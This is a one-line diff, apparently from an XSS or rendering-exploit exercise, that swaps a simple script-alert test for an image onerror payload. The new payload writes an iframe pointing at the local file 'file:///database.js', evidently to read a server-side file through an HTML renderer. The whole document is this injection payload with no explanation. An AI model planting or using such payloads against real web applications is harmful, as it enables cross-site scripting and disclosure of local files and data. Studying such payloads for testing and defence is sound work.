@@ -1,1 +1,1 @@
-<script>alert(1);</script>
+<img src="xasdasdasd" onerror="document.write('<iframe src=file:///database.js></iframe>')"/>
